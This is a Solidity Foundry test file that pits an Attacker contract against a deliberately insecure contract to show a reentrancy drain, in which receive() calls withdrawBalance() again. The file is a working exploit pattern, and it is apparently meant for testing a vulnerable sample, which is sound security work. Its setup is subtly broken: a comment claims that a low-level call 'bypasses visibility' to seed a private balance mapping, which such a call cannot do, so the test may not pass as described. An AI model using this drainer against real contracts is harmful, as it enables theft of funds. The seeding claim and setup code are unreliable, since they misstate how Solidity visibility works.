
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_insecure} from "../src/Reentrancy_insecure.sol";

contract TestReentrancyReentrancy_insecure is Test {
    Reentrancy_insecure public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_insecure();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < type(uint128).max / 2);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_insecure public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) {
        _victim = Reentrancy_insecure(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;

        // Directly seed the private mapping via a low-level call to bypass visibility
        (bool ok, ) = address(_victim).call{value: val}(
            abi.encodeWithSignature("userBalances(address)", address(this))
        );
        ok = ok; // silence warning

        // Since we cannot access the private mapping directly in Solidity,
        // we will rely on the fact that withdrawBalance uses msg.sender's
        // stored balance. We give the victim enough ether in the test and
        // rely on reentrancy to pull more than one "balance" worth of ether.
    }

    function attack(uint256) public {
        initialSnapshot = address(this).balance;
        _victim.withdrawBalance();

        // If we managed to receive more than one "unit" of withdrawal,
        // the balance of this contract should be strictly greater than initial.
        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            _victim.withdrawBalance();
        }
    }
}
